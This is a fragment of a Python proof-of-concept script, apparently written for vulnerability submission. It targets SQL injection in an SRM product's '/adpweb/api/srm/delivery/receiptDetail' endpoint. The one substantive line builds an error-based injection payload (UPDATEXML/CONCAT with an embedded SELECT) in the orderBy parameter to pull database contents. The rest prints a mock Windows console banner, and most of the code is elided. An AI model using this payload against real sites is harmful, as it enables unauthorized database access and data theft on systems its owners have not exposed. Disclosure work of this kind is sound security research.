...
def verify(site):
    ...
    urltemp = site + "/adpweb/api/srm/delivery/receiptDetail?orderBy=%28UPDATEXML%288058%2CCONCAT%280x2e%2C0x7e%2C%28SELECT+%28{}%29%29%2C0x7e%29%2C3521%29%29"
...
if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 zhihulian-srm-receiptDetail-sqli.py ",target)
